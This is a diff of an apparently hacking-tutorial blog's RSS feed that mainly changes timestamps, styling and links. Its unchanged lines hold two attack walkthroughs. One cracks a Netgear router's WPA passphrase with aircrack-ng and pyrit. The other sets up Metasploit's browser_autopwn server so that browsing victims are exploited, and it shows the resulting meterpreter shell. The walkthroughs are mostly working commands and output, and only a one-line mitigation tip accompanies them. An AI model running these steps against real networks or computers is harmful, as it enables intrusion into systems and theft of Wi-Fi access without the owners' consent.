@@ -2,8 +2,8 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
 <channel><title>m3t4lk3y</title><link>https://metalkey.net/index.html</link>
 <description>Hacking tutorials + info</description><language>en</language>
-<lastBuildDate>Thu, 30 Jun 2016 17:54:27 +1000</lastBuildDate>
-<pubDate>Thu, 30 Jun 2016 17:54:27 +1000</pubDate>
+<lastBuildDate>Thu, 30 Jun 2016 22:04:03 +1000</lastBuildDate>
+<pubDate>Thu, 30 Jun 2016 22:04:03 +1000</pubDate>
 <atom:link href="https://metalkey.net/feed.rss" rel="self" type="application/rss+xml" />
 <item><title>
 Netgear Wireless Router Default Passphrase Vulnerability
@@ -23,7 +23,7 @@ Netgear Wireless Router Default Passphrase Vulnerability
 <p>Manual step-by-step instructions @ blackMORE Ops (<a href="http://www.blackmoreops.com/2014/03/13/install-nvidia-driver-kernel-module-cuda-and-pyrit-kali-linux/">http://www.blackmoreops.com/2014/03/13/install-nvidia-driver-kernel-module-cuda-and-pyrit-kali-linux/</a>)
 <code></p>
 
-<div style="background-color: black; color: white; padding: 20px;">
+<div class="code">
 <font color="silver">user@debian8:~$</font> <b>sudo apt-get install aircrack-ng</b><br>
 <font color="silver">user@debian8:~$</font> <b>sudo apt-get install pyrit</b>
 </div>
@@ -38,7 +38,7 @@ Netgear Wireless Router Default Passphrase Vulnerability
 Tutorial @ SecurityTube - <a href="http://www.securitytube.net/groups?operation=view&amp;groupId=9">http://www.securitytube.net/groups?operation=view&amp;groupId=9</a>
 <code></p>
 
-<div style="background-color: black; color: white; padding: 20px;">
+<div class="code">
 <font color="silver">user@debian8:~$</font> <b>airmon-ng start wlan0</b><br>
 <font color="silver">user@debian8:~$</font> <b>airodump-ng mon0</b><br>
 <font color="silver">user@debian8:~$</font> <b>airodump-ng -c 1 -w netgear.cap --bssid 00:11:22:33:44:55 mon0</b><br>
@@ -53,7 +53,7 @@ Tutorial @ SecurityTube - <a href="http://www.securitytube.net/groups?operation=
 <p>Confirm you have useable handshakes, then clean up the capture file and crack the passphrase.<br>
 <code></p>
 
-<div style="background-color: black; color: white; padding: 20px;">
+<div class="code">
 <font color="silver">user@debian8:~$</font> <b>pyrit -r netgear.cap analyze</b><br>
 <font color="silver">user@debian8:~$</font> <b>pyrit -r netgear.cap -o stripped-netgear.cap strip</b><br>
 <font color="silver">user@debian8:~$</font> <b>pyrit -r stripped-netgear.cap -i adjective_noun_3d.txt -b 00:11:22:33:44:55 attack_passthrough</b><br>
@@ -74,10 +74,10 @@ Tutorial @ SecurityTube - <a href="http://www.securitytube.net/groups?operation=
 
 <p>Tags: <a href='tag_wifi.html'>wifi</a></p>
 <!-- text end -->
-]]></description><link>https://metalkey.net/netgear-wireless-router-default-passphrase-vulnerability1498.html</link>
-<guid>https://metalkey.net/./netgear-wireless-router-default-passphrase-vulnerability1498.html</guid>
+]]></description><link>https://metalkey.net/netgear-wireless-router-default-passphrase-vulnerability.html</link>
+<guid>https://metalkey.net/./netgear-wireless-router-default-passphrase-vulnerability.html</guid>
 <dc:creator>metalkey</dc:creator>
-<pubDate>Thu, 30 Jun 2016 17:54:26 +1000</pubDate></item>
+<pubDate>Thu, 30 Jun 2016 22:04:01 +1000</pubDate></item>
 <item><title>
 Metasploit Browser Autopwn – Windows XP SP2
 </title><description><![CDATA[
@@ -90,7 +90,7 @@ Metasploit Browser Autopwn – Windows XP SP2
 <p>Run msfconsole, load the browser_autopwn module and set all required options.<br>
 <code></p>
 
-<div style="background-color: black; color: white; padding: 20px;">
+<div class="code">
 <font color="silver">root@kali:~$</font> <b>msfconsole</b><br>
 <font color="silver">msf ></font> <b>use auxiliary/server/browser_autopwn</b><br>
 <font color="silver">msf auxiliary(browser_autopwn) ></font> <b>set LHOST 192.168.1.12</b><br>
@@ -111,7 +111,7 @@ The Browser Autopwn Server is now running and waiting for victims to browse to t
 This will trigger the browser_autopwn module to serve the appropriate exploit and launch a meterpreter session.<br>
 <code></p>
 
-<div style="background-color: black; color: white; padding: 20px;">
+<div class="code">
 <font color="silver">[*] Meterpreter session 1 opened (192.168.1.12:7777 -> </font><br>
 <font color="silver">192.168.1.13:1045) at 2015-07-25 05:08:06 -0400</font><br>
 <font color="silver">...</font><br>
@@ -142,10 +142,9 @@ You now have shell access to the Windows XP SP3 Victim with the same access as t
 <p>Keep your software fully updated (e.g. Windows, Web Browsers, Java, etc…) and uninstall unused applications.</p>
 
 <p>Tags: <a href='tag_metasploit.html'>metasploit</a></p>
-
 <!-- text end -->
 ]]></description><link>https://metalkey.net/metasploit-browser-autopwn---windows-xp-sp2.html</link>
 <guid>https://metalkey.net/./metasploit-browser-autopwn---windows-xp-sp2.html</guid>
 <dc:creator>metalkey</dc:creator>
-<pubDate>Thu, 30 Jun 2016 17:45:20 +1000</pubDate></item>
+<pubDate>Thu, 30 Jun 2016 22:02:06 +1000</pubDate></item>
 </channel></rss>
